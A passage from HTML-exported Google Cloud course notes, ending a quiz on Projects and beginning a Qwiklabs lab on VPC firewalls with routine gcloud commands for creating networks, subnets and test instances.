TWO)</span></p></li></ol><ul><li><p><strong><span>Selectively enable specific services and APIs.</span></strong></p><p><span>Correct! You can also assign manager permissions more effectively,</span></p></li><li><p><strong><span>Track and manage quota usage.</span></strong></p><p><span>Correct! You can also track general resource usage as well.</span></p></li><li><p><span>Balance server load between different Projects.</span></p></li><li><p><span>Keep on-prem AD/LDAP accounts synced up with user&#39;s Google Cloud resources.</span></p></li></ul><p>&nbsp;</p><h2 id='configuring-virtual-private-cloud-for-isolation-and-security'><span>Configuring Virtual Private Cloud for Isolation and Security</span></h2><h3 id='lab---configuring-vpc-firewalls-2'><span>LAB - Configuring VPC Firewalls</span></h3><h4 id='overview-10'><span>Overview</span></h4><p><span>In this lab, you investigate </span><a href='https://cloud.google.com/vpc'><span>Virtual Private Cloud (VPC)</span></a><span> networks and create firewall rules to allow and deny access to a network and instances.</span></p><p><span>You begin by creating an automatic VPC network, a custom VPC network, and some VPC instances in those networks. You verify that the default-allow-ssh firewall rule is working and then compare this to the user created custom network to verify no ingress is allowed without custom firewall rules.</span></p><p><span>After deleting the default network, you use firewall rule priorities,to allow both ingress and egress of network traffic to your VMs.</span></p><h5 id='objectives-7'><span>Objectives</span></h5><p><span>In this lab, you will learn how to:</span></p><ul><li><p><span>Create an auto-mode network, a custom-mode network, and associated subnetworks.</span></p></li><li><p><span>Investigate firewall rules in the default network and then delete the default network.</span></p></li><li><p><span>Use features of firewall rules for more precise and flexible control of connections.</span></p></li></ul><h4 id='setup-and-requirements-8'><span>Setup and requirements</span></h4><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h5 id='activate-google-cloud-shell-4'><span>Activate Google Cloud Shell</span></h5><p><span>Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.</span></p><p><span>Google Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>In Cloud console, on the top right toolbar, click the Open Cloud Shell button.</span></p><p><img src="images/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D.png" referrerpolicy="no-referrer" alt="Highlighted Cloud Shell icon"></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li></ol><p><span>It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your </span><em><span>PROJECT_ID</span></em><span>. For example:</span></p><p><img src="images/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D.png" referrerpolicy="no-referrer" alt="Project ID highlighted in the Cloud Shell Terminal"></p><p><strong><span>gcloud</span></strong><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ul><li><p><span>You can list the active account name with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - &lt;myaccount&gt;@&lt;mydomain&gt;.com (active)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/mydomain&gt;&lt;/myaccount&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - google1623327_student@qwiklabs.net</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ul><li><p><span>You can list the project ID with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = &lt;project_id&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/project_id&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-44776a13dea667a6</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> Full documentation of </span><strong><span>gcloud</span></strong><span> is available in the </span><a href='https://cloud.google.com/sdk/gcloud'><span>gcloud CLI overview guide </span></a><span>.</span></p><h4 id='task-1-create-vpc-networks-and-instances-2'><span>Task 1. Create VPC networks and instances</span></h4><p><span>In this task, you create an automatic VPC network and custom VPC network, and some initial VPC instances in those networks.</span></p><ol start='' ><li><p><span>On the Google Cloud Console title bar, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>) to open Cloud Shell. If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>To create the network </span><em><span>mynetwork</span></em><span> with auto subnets, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks create mynetwork --subnet-mode=auto</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Note:</span></strong><span> When an auto mode VPC network is created, one subnet from each region is automatically created within it. These automatically created subnets use a set of predefined IP ranges that fit within the 10.128.0.0/9 CIDR block.</span></p><p><span>You will now create a network with custom subnets. You can choose any private RFC 1918 CIDR block for the primary IP address range of the subnets.</span></p><ol start='' ><li><p><span>To create the network </span><em><span>privatenet</span></em><span> with custom subnets, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks create privatenet \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--subnet-mode=custom</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>To create a custom subnet in the privatenet network, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks subnets create privatesubnet \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=privatenet --region=us-east4 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--range=10.0.0.0/24 --enable-private-ip-google-access</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>To create some instances to use later for testing in all networks, run these commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create default-vm-1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-east4-a --network=default</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create mynet-vm-1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-east4-a --network=mynetwork</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create mynet-vm-2 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-central1-f --network=mynetwork</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create privatenet-bastion \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-east4-b  --subnet=privatesubnet --can-ip-forward</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" 